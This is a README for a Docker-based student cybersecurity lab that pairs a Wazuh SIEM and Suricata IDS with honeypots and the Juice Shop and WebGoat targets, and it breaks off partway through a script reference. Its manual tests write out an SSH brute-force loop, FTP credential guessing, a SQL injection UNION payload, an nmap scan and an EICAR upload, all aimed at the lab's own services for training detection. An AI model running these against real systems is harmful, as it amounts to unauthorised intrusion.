# CyberLab: Enterprise Security Infrastructure

A comprehensive, production-grade cybersecurity lab environment for defensive security training, SIEM deployment, threat detection, and incident response. This infrastructure implements defense-in-depth with 5 isolated network segments, 20+ integrated services, 5 interactive honeypots, and 500+ detection rules.

**Status:** ✅ **Fully Operational** (Updated: November 28, 2025)
**Platform:** Windows/macOS/Linux with Docker
**Total Services:** 20 containers + 5 honeypots | **Network Segments:** 5 | **Detection Rules:** 500+ | **Test Scripts:** 17

---

## Table of Contents

1. [Project Overview](#project-overview)
2. [Architecture](#architecture)
3. [Services & Components](#services--components)
4. [Honeypot Services & Threat Simulation](#honeypot-services--threat-simulation)
5. [Attack Simulation & Testing](#attack-simulation--testing)
6. [Service-Specific Configuration & Testing](#service-specific-configuration--testing)
7. [Complete End-to-End Attack Scenarios](#complete-end-to-end-attack-simulation-scenarios)
8. [Quick Start](#quick-start)
9. [Prerequisites](#prerequisites)
10. [Installation & Setup](#installation--setup)
11. [Running Scripts](#running-scripts)
12. [Accessing Services](#accessing-services)
13. [Configuration](#configuration)
14. [Security Policies](#security-policies)
15. [Troubleshooting](#troubleshooting)
16. [Documentation](#documentation)

---

## Project Overview

**CyberLab** is an integrated cybersecurity infrastructure designed for:

- **Security Training:** Complete lab for cybersecurity students and professionals with real attack scenarios
- **SIEM Deployment:** Test and learn Wazuh configuration, log analysis, and correlation
- **Threat Detection:** IDS/IPS rule development with Suricata (400+ custom rules)
- **Honeypot Research:** Interactive honeypots capturing real attack patterns
- **Web App Security:** OWASP Top 10 vulnerability training with Juice Shop & WebGoat
- **Container Security:** Practice NeuVector policies and runtime threat detection
- **Access Control:** Test network segmentation with 5-layer defense
- **Incident Response:** Simulated multi-stage attack scenarios with centralized logging
- **Protocol Security:** Protocol-level exploitation and detection across 9 different protocols
- **Backup & Recovery:** Disaster recovery procedures with 30-day retention

### Key Features

✅ **Centralized SIEM** - Wazuh 4.14.1 with 100+ custom honeypot/webapp rules
✅ **Network IDS/IPS** - Suricata with 400+ rules covering databases, protocols, web, malware, CVEs
✅ **Interactive Honeypots** - Cowrie, Dionaea, Juice Shop, WebGoat capturing real attacks
✅ **Container Security** - NeuVector for runtime threat detection and vulnerability scanning
✅ **VPN Access** - OpenVPN with secure remote access and admin panel
✅ **Authentication** - OpenLDAP for identity management across all services
✅ **Reverse Proxy** - Traefik with access control policies and TLS termination
✅ **Attack Simulation** - 17 automated testing scripts with 7 complex attack scenarios
✅ **Database Services** - PostgreSQL and MongoDB for data storage and SQL injection testing
✅ **Infrastructure-as-Code** - Docker Compose for reproducibility and versioning

---

## Architecture

### Network Design (5-Layer Defense-In-Depth)

```
┌──────────────────────────────────────────────────────────┐
│                    macOS Host Network                    │
│                      127.0.0.1:xxxx                      │
└──────────────────────────────────┬──────────────────────┘
                                   │
    ┌──────────────────────────────┼──────────────────────┐
    │                              │                      │
[LAYER 1]                    [LAYER 2]            [LAYERS 3-5]
External/VPN               DMZ/Public           Protected Services
10.10.0.0/24              10.10.10.0/24         10.10.20.0/24
                                                10.10.30.0/24
    │                          │                 10.10.40.0/24
    │                          │                      │
OpenVPN:10.10.0.20      Traefik:10.10.10.5    LDAP, PostgreSQL
NeuVector:10.10.0.10    Nginx:10.10.10.10     Wazuh, Monitoring
Traefik:10.10.0.30      DNS:10.10.10.50       Workstation, Backup
                        Suricata:10.10.10.70
                        Wazuh Mgr:10.10.10.60
```

### Network Segments

| Layer       | Network       | Purpose                                       | Services                                            |
| ----------- | ------------- | --------------------------------------------- | --------------------------------------------------- |
| **Layer 1** | 10.10.0.0/24  | **External/VPN** - Remote access entry point  | OpenVPN, NeuVector, Traefik                         |
| **Layer 2** | 10.10.10.0/24 | **DMZ** - Public-facing services              | Traefik, Nginx, DNS, Suricata, Wazuh Mgr            |
| **Layer 3** | 10.10.20.0/24 | **Internal** - Protected services & data      | PostgreSQL, MongoDB, LDAP, Rocket.Chat, Workstation |
| **Layer 4** | 10.10.30.0/24 | **Security** - Isolated monitoring & analysis | Wazuh (Indexer, Dashboard), Suricata, NeuVector     |
| **Layer 5** | 10.10.40.0/24 | **Management** - Admin interfaces             | Traefik Dashboard, OpenVPN Admin, DNS Console       |

---

## Services & Components

| Service                    | Container                      | Version   | Ports                                                       | Role                                    | Networks                                |
| -------------------------- | ------------------------------ | --------- | ----------------------------------------------------------- | --------------------------------------- | --------------------------------------- |
| **Wazuh Manager**          | wazuh/wazuh-manager            | 4.14.1    | 514/UDP, 1514-1515                                          | SIEM central manager                    | Security, DMZ, Internal, Mgmt           |
| **Wazuh Indexer**          | wazuh/wazuh-indexer            | 4.14.1    | 9200                                                        | OpenSearch log indexing                 | Security, Mgmt                          |
| **Wazuh Dashboard**        | wazuh/wazuh-dashboard          | 4.14.1    | 5601                                                        | SIEM web UI & analytics                 | Security, Mgmt                          |
| **Suricata**               | jasonish/suricata              | latest    | Host network                                                | Network IDS/IPS (400+ rules)            | DMZ, Security                           |
| **NeuVector**              | neuvector.allinone             | 5.3.5     | 8443, 18300-18401                                           | Container security & runtime protection | External, DMZ, Internal, Security, Mgmt |
| **Traefik**                | traefik                        | v3.0      | 80, 443, 8082                                               | Reverse proxy & load balancer           | All networks                            |
| **Nginx**                  | nginx                          | alpine    | 80                                                          | Web server                              | DMZ, Internal                           |
| **OpenVPN**                | openvpn/openvpn-as             | latest    | 943, 1194/UDP                                               | VPN gateway & admin panel               | External, Mgmt                          |
| **OpenLDAP**               | osixia/openldap                | latest    | 389, 636                                                    | Directory service (LDAP)                | Internal, Security, Mgmt                |
| **phpLDAPadmin**           | osixia/phpldapadmin            | latest    | 80                                                          | LDAP web UI                             | Internal, Security                      |
| **PostgreSQL**             | postgres                       | 15-alpine | 5432                                                        | Relational database                     | Internal                                |
| **MongoDB**                | mongo                          | 5         | 27017                                                       | NoSQL document database                 | Internal                                |
| **Rocket.Chat**            | rocketchat                     | latest    | 80/443                                                      | Team communication platform             | Internal, Security                      |
| **Technitium DNS**         | technitium/dns-server          | latest    | 53, 5380                                                    | DNS server & console                    | All networks                            |
| **Workstation**            | dorowu/ubuntu-desktop-lxde-vnc | latest    | 5900, 6080                                                  | Remote desktop (VNC/Web)                | Internal                                |
| **Backup Service**         | alpine                         | latest    | —                                                           | Automated daily backups                 | Internal, Security, Mgmt                |
| **Cowrie SSH/Telnet**      | cowrie/cowrie                  | latest    | 2222 (SSH), 2223 (Telnet)                                   | SSH/Telnet honeypot                     | Internal, Security                      |
| **Dionaea Multi-Protocol** | dionaea                        | latest    | 21 (FTP), 445 (SMB), 1433 (MSSQL), 3306 (MySQL), 3389 (RDP) | Protocol honeypot suite                 | Internal, Security                      |
| **OWASP Juice Shop**       | bkimminich/juice-shop          | latest    | 3000 (HTTP)                                                 | Vulnerable e-commerce app               | Internal, Security                      |
| **OWASP WebGoat**          | webgoat/goatandwolf            | latest    | 8080 (HTTP)                                                 | Web security training platform          | Internal, Security                      |

**Total: 20 Active Containers** | **Detection Rules:** 400+ (Suricata) + 100+ (Wazuh Webapp)

---

## Windows-Specific Notes

### PowerShell vs Bash Scripts

This project includes scripts in both formats:

- **PowerShell (`.ps1`)**: Native Windows scripts - use these when available
- **Bash (`.sh`)**: Linux/macOS scripts - require Git Bash or WSL on Windows

**Running Bash Scripts on Windows:**

Option 1 - Git Bash (Recommended):

```powershell
# Install Git for Windows (includes Git Bash)
# Download from: https://git-scm.com/download/win

# Run bash scripts using Git Bash
cd infra\scripts
bash ./seed-ldap.sh
```

Option 2 - WSL2 (Windows Subsystem for Linux):

```powershell
# Enable WSL2 and install Ubuntu
wsl --install

# Access WSL
wsl

# Navigate to project
cd /mnt/c/Users/Student/Documents/TAFE-Cyber-Project
```

### Docker Desktop Configuration

For optimal performance on Windows:

1. **Enable WSL2 Integration:**

   - Docker Desktop → Settings → Resources → WSL Integration
   - Enable integration with your WSL2 distros

2. **Adjust Resource Limits:**

   - Docker Desktop → Settings → Resources
   - Memory: Minimum 8GB (16GB recommended)
   - CPUs: 4+ cores recommended
   - Disk: 50GB+ available

3. **File Sharing:**
   - Docker Desktop → Settings → Resources → File Sharing
   - Ensure project directory is accessible

### Path Differences

Windows uses backslashes (`\`) in paths:

```powershell
# Windows
cd C:\Users\Student\Documents\TAFE-Cyber-Project\infra\scripts

# Inside Docker containers, always use forward slashes (/)
docker exec openldap ls /etc/ldap
```

### PowerShell Execution Policy

If you get an error running `.ps1` scripts:

```powershell
# Check current policy
Get-ExecutionPolicy

# Allow running local scripts (run as Administrator)
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
```

---

## Quick Start

### Start All Services

**Windows (PowerShell):**

```powershell
cd infra
docker compose up -d
```

**macOS/Linux (Bash):**

```bash
cd infra
docker-compose up -d
```

### Check Service Status

```powershell
# Windows & macOS/Linux
docker compose ps
```

You should see all 15 services as `running`.

### View Logs

```powershell
# View all logs
docker compose logs -f

# View specific service logs
docker compose logs -f wazuh.manager
docker compose logs -f suricata
docker compose logs -f traefik
```

### Stop All Services

```powershell
# Windows & macOS/Linux
docker compose down
```

---

## Prerequisites

### System Requirements

- **Docker Desktop** (v20.10+) for Windows
- **Docker Compose** (v2.0+) - included with Docker Desktop
- **Windows 10/11** with WSL2 enabled OR **macOS/Linux**
- **Memory:** 8GB minimum (16GB+ recommended)
- **Storage:** 50GB+ available space for volumes and logs
- **Network:** Static or reserved IP if accessing remotely

### Software Installation

**Windows (Recommended):**

1. Install Docker Desktop for Windows:

   - Download from https://www.docker.com/products/docker-desktop
   - Ensure WSL2 integration is enabled during installation
   - Restart computer after installation

2. Verify installation in PowerShell:
   ```powershell
   docker --version
   docker compose version
   ```

**macOS (using Homebrew):**

```bash
brew install docker docker-compose
docker --version
docker-compose --version
```

**Linux (Ubuntu/Debian):**

```bash
sudo apt-get install docker.io docker-compose
docker --version
docker-compose --version
```

### Network Configuration

**Windows:** Add DNS entries to `C:\Windows\System32\drivers\etc\hosts` (requires Administrator privileges)

**macOS/Linux:** Add DNS entries to `/etc/hosts`

Open hosts file in text editor as Administrator/root and add:

```
127.0.0.1       localhost
127.0.0.1       cyberlab.local
127.0.0.1       traefik.cyberlab.local
127.0.0.1       wazuh.cyberlab.local
127.0.0.1       neuvector.cyberlab.local
127.0.0.1       vpn.cyberlab.local
127.0.0.1       ldap.cyberlab.local
127.0.0.1       dns.cyberlab.local
127.0.0.1       rocketchat.cyberlab.local
```

Or use the provided hosts file entries in `HOSTS_FILE_ENTRIES.txt`.

**Windows Quick Edit (PowerShell as Administrator):**

```powershell
# Open hosts file in Notepad as Administrator
notepad C:\Windows\System32\drivers\etc\hosts

# Or append entries directly
Get-Content HOSTS_FILE_ENTRIES.txt | Add-Content C:\Windows\System32\drivers\etc\hosts
```

---

## Installation & Setup

### Step 1: Clone or Extract Project

**Windows (PowerShell):**

```powershell
cd C:\Users\Student\Documents
# If cloning from Git:
git clone <repository-url> TAFE-Cyber-Project
cd TAFE-Cyber-Project
```

**macOS/Linux:**

```bash
cd /path/to/CyberSecurity-Diploma/Project
```

### Step 2: Configure Environment Variables

**Windows (PowerShell):**

```powershell
# Copy template to create .env file
Copy-Item infra\.env.template infra\.env

# Edit .env with your desired values
notepad infra\.env
```

**macOS/Linux (Bash):**

```bash
# Copy template to create .env file
cp infra/.env.template infra/.env

# Edit .env with your desired values
nano infra/.env
```

Key variables to set:

```env
# Service Passwords (CHANGE THESE)
LDAP_ADMIN_PASSWORD=admin
POSTGRES_PASSWORD=SecureP@ssw0rd
MONGODB_PASSWORD=your_secure_password
OPENVPN_ADMIN_PASSWORD=your_admin_password

# Network Configuration
EXTERNAL_NETWORK=10.10.0.0/24
DMZ_NETWORK=10.10.10.0/24
INTERNAL_NETWORK=10.10.20.0/24
SECURITY_NETWORK=10.10.30.0/24
MGMT_NETWORK=10.10.40.0/24

# Service Hostnames
DOMAIN=cyberlab.local
```

### Step 3: Generate Passwords (Optional)

**Windows (PowerShell):**

```powershell
cd infra\scripts
# Use Git Bash or WSL to run bash script
bash generate-passwords.sh
# OR manually create password files in infra\secrets\
```

**macOS/Linux (Bash):**

```bash
cd infra/scripts
chmod +x generate-passwords.sh
./generate-passwords.sh
```

This generates secure passwords and saves them to `infra/secrets/`.

### Step 4: Generate Wazuh SSL Certificates

Before starting the infrastructure, generate SSL certificates for Wazuh components:

**Windows (PowerShell):**

```powershell
cd infra\configs\wazuh

# Generate certificates using Docker
docker compose -f generate-indexer-certs.yml run --rm generator

# Verify certificates were created
dir wazuh_indexer_ssl_certs
```

**macOS/Linux (Bash):**

```bash
cd infra/configs/wazuh

# Generate certificates using Docker
docker compose -f generate-indexer-certs.yml run --rm generator

# Verify certificates were created
ls -la wazuh_indexer_ssl_certs/
```

This creates the following certificates in `wazuh_indexer_ssl_certs/`:

- `admin.pem` - Admin client certificate
- `admin-key.pem` - Admin private key
- `wazuh.indexer.pem` - Indexer node certificate
- `wazuh.indexer-key.pem` - Indexer private key
- `wazuh.manager.pem` - Manager node certificate
- `wazuh.manager-key.pem` - Manager private key
- `wazuh.dashboard.pem` - Dashboard node certificate
- `wazuh.dashboard-key.pem` - Dashboard private key
- `root-ca.pem` - Root Certificate Authority

**Note:** These certificates are required for secure communication between Wazuh components. The generation only needs to be done once during initial setup.

### Step 5: Start Infrastructure

**Windows (PowerShell):**

```powershell
cd infra
docker compose up -d
```

**macOS/Linux (Bash):**

```bash
cd infra
docker-compose up -d
```

Wait 60-90 seconds for all services to fully initialize.

### Step 6: Initialize Services

#### Seed LDAP Directory

**Windows (PowerShell):**

```powershell
cd infra\scripts
# Use Git Bash or WSL
bash seed-ldap.sh
```

**macOS/Linux (Bash):**

```bash
cd infra/scripts
chmod +x seed-ldap.sh
./seed-ldap.sh
```

This populates OpenLDAP with initial users and groups:

- `admin` (cn=admin,dc=cyberlab,dc=local)
- `security_team` group
- Test users for access control testing

#### Initialize DNS Server

**Windows (PowerShell):**

```powershell
cd infra\scripts
# Use Git Bash or WSL
bash init-dns-tools.sh
```

**macOS/Linux (Bash):**

```bash
cd infra/scripts
chmod +x init-dns-tools.sh
./init-dns-tools.sh
```

#### Initialize OpenVPN

**Windows (PowerShell - Native):**

```powershell
cd infra
.\scripts\init-openvpn.ps1
```

**macOS/Linux (Bash):**

```bash
cd infra/scripts
chmod +x init-openvpn.sh
./init-openvpn.sh
```

This configures the OpenVPN Access Server with admin credentials and generates client profiles.

### Step 7: Verify Deployment

**Windows (PowerShell):**

```powershell
cd infra\scripts
# Use Git Bash or WSL
bash verify-network-access.sh
```

**macOS/Linux (Bash):**

```bash
cd infra/scripts
chmod +x verify-network-access.sh
./verify-network-access.sh
```

This tests connectivity between services and validates access control policies.

---

## Honeypot Services & Threat Simulation

### Overview: Interactive Honeypots

This lab includes 5 honeypot services designed to capture and log attack attempts for training and detection testing:

| Honeypot       | Service Type   | Ports                                                       | Purpose                          | Log Format                  |
| -------------- | -------------- | ----------------------------------------------------------- | -------------------------------- | --------------------------- |
| **Cowrie**     | SSH/Telnet     | 2222 (SSH), 2223 (Telnet)                                   | Capture remote access attacks    | JSON + Syslog               |
| **Dionaea**    | Multi-Protocol | 21 (FTP), 445 (SMB), 1433 (MSSQL), 3306 (MySQL), 3389 (RDP) | Capture protocol exploitation    | JSON + Syslog               |
| **Juice Shop** | Web App        | 3000 (HTTP)                                                 | OWASP Top 10 training/testing    | HTTP Logs                   |
| **WebGoat**    | Web Training   | 8080 (HTTP)                                                 | Interactive web security lessons | HTTP Logs + Training Events |

### Honeypot Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     ATTACK SOURCE                           │
│                   (Attacker / Tester)                       │
└─────────────────────────┬───────────────────────────────────┘
                          │
        ┌─────────────────┼─────────────────┐
        │                 │                 │
        ▼                 ▼                 ▼
    ┌────────┐      ┌─────────┐      ┌──────────────┐
    │ Cowrie │      │ Dionaea │      │ Juice Shop   │
    │SSH:2222│      │Multi    │      │WebGoat       │
    │Tel:2223│      │Protocol │      │Port 3000/8080│
    └────────┘      └─────────┘      └──────────────┘
        │                 │                 │
        └─────────────────┼─────────────────┘
                          │
    ┌─────────────────────▼─────────────────────┐
    │      Wazuh Manager (SIEM)                │
    │   Log Aggregation & Detection             │
    │   (Real-time Alert Generation)            │
    └──────────────┬──────────────────────────┘
                   │
    ┌──────────────┴──────────────┐
    │                             │
    ▼                             ▼
┌─────────────┐         ┌──────────────────┐
│  Wazuh      │         │ Suricata (IDS)   │
│ Dashboard   │         │ Network Detection│
│ (Analysis)  │         └──────────────────┘
└─────────────┘
```

### Accessing Honeypots

**SSH Honeypot (Cowrie) - Port 2222:**

```bash
ssh -p 2222 root@10.10.20.70
# Any credentials work - it captures all attempts
```

**Telnet Honeypot (Cowrie) - Port 2223:**

```bash
telnet 10.10.20.70 2223
# Type any credentials - honeypot logs them
```

**FTP Honeypot (Dionaea) - Port 21:**

```bash
ftp 10.10.20.71
# Try login: anonymous / anonymous or any credentials
```

**SMB/Windows Honeypot (Dionaea) - Port 445:**

```bash
# Windows (PowerShell):
net use \\10.10.20.71\share

# Linux:
smbclient //10.10.20.71/share -N
```

**MSSQL Honeypot (Dionaea) - Port 1433:**

```bash
sqlcmd -S 10.10.20.71 -U sa -P password
```

**MySQL Honeypot (Dionaea) - Port 3306:**

```bash
mysql -h 10.10.20.71 -u root -p
# Password: any input accepted
```

**RDP Honeypot (Dionaea) - Port 3389:**

```bash
# Windows: Use Remote Desktop Connection (mstsc.exe)
# Address: 10.10.20.71:3389
```

**Juice Shop (Vulnerable Web App):**

```
https://juice-shop.cyberlab.local/
```

**WebGoat (Training Platform):**

```
https://webgoat.cyberlab.local:8443/
```

---

## Attack Simulation & Testing

### Complete Attack Simulation Suite

The project includes automated scripts to simulate realistic attack scenarios against honeypots:

#### Script: `simulate-honeypot-attacks.sh`

Comprehensive attack simulation across all honeypots:

```bash
cd infra/scripts
chmod +x simulate-honeypot-attacks.sh
./simulate-honeypot-attacks.sh
```

**Attack Scenarios Simulated:**

1. **SSH Brute Force (Section 1)**

   - Multiple login attempts with different credentials
   - Tests Cowrie's credential logging
   - Expected Wazuh Alert: "SSH brute force attack detected"

2. **Telnet Connection Attempts (Section 2)**

   - Raw telnet connection with commands
   - Tests protocol-level detection
   - Expected Alert: "Telnet connection attempt"

3. **HTTP/HTTPS Web Attacks (Section 3)**

   - SQL injection payloads to Juice Shop
   - Path traversal attempts
   - XSS payloads
   - Expected Alerts: Multiple high-level webapp attacks

4. **SMB Enumeration (Section 4)**

   - SMB network reconnaissance
   - Share enumeration attempts
   - Expected Alert: "SMB reconnaissance detected"

5. **FTP Authentication Attempts (Section 5)**

   - Anonymous and credential-based FTP logins
   - File listing and transfer simulation
   - Expected Alert: "FTP login attempt"

6. **SQL Injection Payloads (Section 6)**

   - UNION-based SQL injection
   - Boolean-based detection attempts
   - Expected Alert: "SQL injection attack detected"

7. **Port Scanning Simulation (Section 7)**

   - TCP port scans across honeypot ports
   - Service discovery probes
   - Expected Alert: "Port scan detected"

8. **Low-Rate Distributed Attacks (Section 8)**
   - Slow, distributed attack pattern
   - Evades simple rate-based detection
   - Expected Alert: "Low-rate attack pattern"

**Example Output:**

```
═══════════════════════════════════════════════
Honeypot Attack Simulation Suite
═══════════════════════════════════════════════

[1] SSH Brute Force Attack Simulation
---
Attempting SSH connections to Cowrie (port 2222)...
SSH attempt 1 of 5...
SSH attempt 2 of 5...
✓ SSH brute force simulation completed

[2] Telnet Connection Attempt
---
Attempting Telnet connection to Cowrie (port 2223)...
✓ Telnet connection simulation completed

... [additional sections] ...

Attack Simulation Summary
✓ All attack simulations have been completed
✓ Check Wazuh Dashboard for alerts!
```

---

### Individual Attack Simulation: `test-honeypot-attacks.sh`

For targeted, individual attack testing:

```bash
cd infra/scripts
chmod +x test-honeypot-attacks.sh
./test-honeypot-attacks.sh
```

**Capabilities:**

- **SSH Brute-Force Attack** - Multiple login attempts with credential lists
- **Telnet Connection Simulations** - Command execution over telnet
- **HTTP Exploit Payloads** - Web application attack testing
- **SMB Enumeration** - Windows share discovery
- **FTP Access Attempts** - File transfer simulation
- **MySQL Query Injection** - Database exploitation attempts
- **Port and Service Scanning** - Network reconnaissance

---

### Suricata IDS/IPS Testing: `test_suricata_rules.sh`

Validate Suricata detection rule functionality:

```bash
cd infra
chmod +x test_suricata_rules.sh
./test_suricata_rules.sh
```

**What it Tests:**

- **Rule Loading** - Verifies all 400+ rules are loaded correctly
- **EVE JSON Output** - Confirms Suricata generates proper JSON alerts
- **Alert Detection** - Tests basic IDS alert triggering
- **Performance Metrics** - Captures packets/sec and rules/sec
- **Memory Usage** - Monitors Suricata resource consumption

**Expected Output:**

```
Testing Suricata IDS/IPS Rules...

[✓] Suricata service is running
[✓] 400+ custom rules loaded successfully
[✓] EVE JSON output is being generated
[✓] Alert detection working

Rules Statistics:
  - Total Rules: 427
  - Database Attacks: 50
  - Web Attacks: 75
  - Protocol Attacks: 48
  - Malware/C2: 42
  - Infrastructure: 36
  - CVE-Specific: 30

Performance:
  - Packets/sec: 1,250
  - Rules/sec: 42
  - Memory: 256MB
```

---

### Honeypot Verification & Integration Testing

#### Script: `verify-honeypots.sh`

Comprehensive honeypot health check and integration verification:

```bash
cd infra/scripts
chmod +x verify-honeypots.sh
./verify-honeypots.sh
```

**Sections Tested:**

1. **Container Status** - All honeypot containers running
2. **Network Connectivity** - Port accessibility
3. **Log Generation** - JSON/syslog output validation
4. **Wazuh Integration** - Alert routing verification
5. **Traefik Routing** - Service discovery configuration
6. **Performance Metrics** - Resource usage
7. **SSH Attack Simulation** - Live attack testing
8. **Database Connectivity** - Service responsiveness

**Sample Output:**

```
[1] Container Status Check
---
✓ Cowrie container is running (healthy)
✓ Dionaea container is running (healthy)
✓ Juice Shop container is running (healthy)
✓ WebGoat container is running (healthy)

[2] Network Connectivity
---
✓ Cowrie SSH port (2222) is accessible
✓ Cowrie Telnet port (2223) is accessible
✓ Dionaea FTP port (21) is accessible
✓ Dionaea SMB port (445) is accessible
✓ Juice Shop port (3000) is accessible

[3] Log Generation Status
---
✓ cowrie.json exists (Lines: 23)
✓ dionaea.json exists (Lines: 15)
✓ juice-shop logs available
✓ webgoat logs available

[4] Attack Simulation
---
Simulating SSH attack on Cowrie...
✓ SSH attack successfully captured
✓ Attack logged in cowrie.json

Summary: All honeypots operational and integrated!
```

---

#### Script: `verify-wazuh-honeypot-integration.sh`

Validate Wazuh SIEM integration with all honeypots:

```bash
cd infra/scripts
chmod +x verify-wazuh-honeypot-integration.sh
./verify-wazuh-honeypot-integration.sh
```

**Validates:**

1. **Wazuh Configuration** - Honeypot log paths configured
2. **Log File Paths** - All expected log files exist
3. **Alert Routing** - Logs flow to Wazuh Manager
4. **Decoder Activation** - Honeypot decoders loaded
5. **Rule Activation** - Honeypot detection rules active
6. **Alert Generation** - Real alerts being created
7. **Wazuh Dashboard** - Alerts visible in UI

**Sample Output:**

```
[1] Wazuh Configuration Check
---
✓ Wazuh Manager is running and responsive
✓ Wazuh API accessible at wazuh.manager:55000

[2] Log File Paths Configuration
---
✓ Cowrie JSON path configured: /var/log/cowrie/cowrie.json
✓ Dionaea JSON path configured: /var/log/dionaea/dionaea.json
✓ Juice Shop logs configured
✓ WebGoat logs configured

[3] Honeypot Log File Status
---
✓ cowrie.json exists (Lines: 45)
✓ dionaea.json exists (Lines: 32)
✓ Log files actively growing

[4] Wazuh Decoders Status
---
✓ Honeypot decoders loaded (cowrie, dionaea, juice_shop, webgoat)
✓ Custom webapp decoders: 12 active

[5] Wazuh Rules Status
---
✓ Honeypot-specific rules loaded (100+ rules active)
✓ SSH honeypot rules: 5 active
✓ Web app honeypot rules: 8 active
✓ Protocol honeypot rules: 6 active

[6] Alert Generation
---
✓ Cowrie alerts flowing to Wazuh
✓ Dionaea alerts flowing to Wazuh
✓ Webapp alerts flowing to Wazuh
✓ Real-time alerts generated: 23

[7] Dashboard Accessibility
---
✓ Wazuh Dashboard: https://wazuh.cyberlab.local
✓ Honeypot alerts visible in real-time dashboard
```

---

### Real-Time Attack Monitoring

#### View Live Honeypot Activity

**Cowrie SSH/Telnet Logs:**

```bash
# View real-time logs
docker logs -f cowrie

# View JSON events
docker exec cowrie tail -f /var/log/cowrie/cowrie.json | jq .

# Count active sessions
docker exec cowrie grep "session_" /var/log/cowrie/cowrie.json | wc -l
```

**Dionaea Protocol Logs:**

```bash
# View real-time logs
docker logs -f dionaea

# View JSON events
docker exec dionaea tail -f /var/log/dionaea/dionaea.json | jq .

# Check incident logs
docker exec dionaea cat /var/log/dionaea/incidents.log
```

**Wazuh Alert Monitoring:**

```bash
# View Wazuh manager logs for honeypot alerts
docker exec wazuh.manager tail -f /var/ossec/logs/alerts/alerts.json | \
  jq 'select(.group[] == "honeypot")'

# Count honeypot alerts by type
docker exec wazuh.manager grep "honeypot" /var/ossec/logs/alerts/alerts.json | \
  jq '.rule.description' | sort | uniq -c
```

**Suricata Detection Logs:**

```bash
# View EVE alerts in real-time
docker exec suricata tail -f /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'

# Filter by alert severity
docker exec suricata tail -f /var/log/suricata/eve.json | \
  jq 'select(.alert.severity==1)'
```

---

### Manual Attack Testing

#### Test 1: SSH Brute Force Against Cowrie

```bash
# Step 1: Generate SSH traffic with multiple credentials
for user in root admin test; do
  for pass in password123 admin P@ssw0rd; do
    timeout 1 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      "$user@10.10.20.70" -p 2222 2>/dev/null || true
    sleep 0.2
  done
done

# Step 2: Check Cowrie logs
docker exec cowrie tail -20 /var/log/cowrie/cowrie.json

# Step 3: Verify Wazuh alert
docker exec wazuh.manager grep -i "ssh.*brute" /var/ossec/logs/alerts/alerts.json | tail -1

# Step 4: View in Wazuh Dashboard
# Visit https://wazuh.cyberlab.local
# Search: group:"ssh_attack" AND agent.name:"honeypot*"
```

#### Test 2: SQL Injection on Juice Shop

```bash
# Step 1: Send SQL injection payload
curl -s "https://juice-shop.cyberlab.local/api/products?q=1' UNION SELECT NULL--" \
  -k | jq .

# Step 2: Check Juice Shop logs
docker logs juice-shop | grep -i "sql\|union\|injection"

# Step 3: Verify Wazuh alert
docker exec wazuh.manager grep -i "sql.*injection" /var/ossec/logs/alerts/alerts.json | tail -1

# Step 4: View alert in Wazuh Dashboard
# Search: group:"web_attack" AND group:"sqli"
```

#### Test 3: FTP Credential Guessing

```bash
# Step 1: Send FTP credentials
for cred in "anonymous:anonymous" "ftp:ftp" "admin:admin"; do
  USER=$(echo $cred | cut -d: -f1)
  PASS=$(echo $cred | cut -d: -f2)
  timeout 2 ftp -n 10.10.20.71 << EOF
user $USER $PASS
quit
EOF
done

# Step 2: Check Dionaea logs
docker exec dionaea tail -20 /var/log/dionaea/dionaea.json | jq 'select(.protocol=="ftp")'

# Step 3: Verify Wazuh alert
docker exec wazuh.manager grep -i "ftp" /var/ossec/logs/alerts/alerts.json | tail -1
```

#### Test 4: Port Scanning on Dionaea

```bash
# Step 1: Run nmap scan (if available)
nmap -p 21,445,1433,3306,3389 10.10.20.71 2>/dev/null

# Step 2: Check Dionaea detection
docker exec dionaea tail -20 /var/log/dionaea/incidents.log

# Step 3: Verify Suricata detection
docker exec suricata grep "port.*scan" /var/log/suricata/eve.json | tail -5 | jq .

# Step 4: Check Wazuh alerts
docker exec wazuh.manager grep -i "scan" /var/ossec/logs/alerts/alerts.json | tail -3
```

#### Test 5: Malware Signature Detection

```bash
# Step 1: Create EICAR test file (harmless malware test string)
EICAR="X5O!P%@AP[4\\PZX54(P^)7CC)7}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*"

# Step 2: Send to Juice Shop (simulating malware upload)
curl -s -X POST "https://juice-shop.cyberlab.local/file-upload" \
  -F "file=@<(echo $EICAR)" -k

# Step 3: Check detection
docker exec wazuh.manager grep -i "eicar\|malware" /var/ossec/logs/alerts/alerts.json | tail -1

# Step 4: Verify Suricata detection
docker exec suricata grep -i "malware\|signature" /var/log/suricata/eve.json | tail -1 | jq .
```

---

### Expected Alert Examples in Wazuh

Once attacks are simulated, you should see alerts like:

**SSH Brute Force Alert:**

```json
{
  "timestamp": "2025-11-28T10:30:45.123Z",
  "rule": {
    "level": 9,
    "description": "SSH brute force attack detected",
    "id": "300001",
    "groups": ["ssh_attack", "authentication_failure"]
  },
  "decoder": { "name": "cowrie" },
  "agent": { "name": "honeypot-cowrie" },
  "data": {
    "srcip": "10.10.0.50",
    "srcport": 52341,
    "dstip": "10.10.20.70",
    "dstport": 2222,
    "action": "login_failed"
  }
}
```

**SQL Injection Alert:**

```json
{
  "timestamp": "2025-11-28T10:31:20.456Z",
  "rule": {
    "level": 8,
    "description": "SQL Injection attack detected on Juice Shop",
    "id": "100301",
    "groups": ["webapp_attack", "injection", "database"]
  },
  "decoder": { "name": "juice_shop_sql_injection" },
  "agent": { "name": "honeypot-juice-shop" },
  "data": {
    "srcip": "10.10.0.50",
    "uri": "/api/products?q=1' UNION SELECT NULL--",
    "http_method": "GET"
  }
}
```

---

### Backup and System Recovery Scripts

**Manual Backup Operations:**

```bash
# Create immediate backup
docker exec backup tar -czf "/backups/manual-$(date +%Y%m%d_%H%M%S).tar.gz" /backup/

# List all available backups
docker exec backup ls -lh /backups/ | grep -E "^-"

# Calculate backup size
docker exec backup du -sh /backups/

# Restore from specific backup
docker exec backup tar -xzf "/backups/backup-20251128_020000.tar.gz" -C /backup/

# Delete old backups (keep only 10 most recent)
docker exec backup bash -c 'ls -t /backups/*.tar.gz | tail -n +11 | xargs rm -f'
```

---

## Complete Script Reference

### Attack & Honeypot Testing Scripts (in `infra/scripts/`)

#### 1. `simulate-honeypot-attacks.sh` ⭐ **PRIMARY ATTACK SUITE**

```bash
chmod +x infra/scripts/simulate-honeypot-attacks.sh
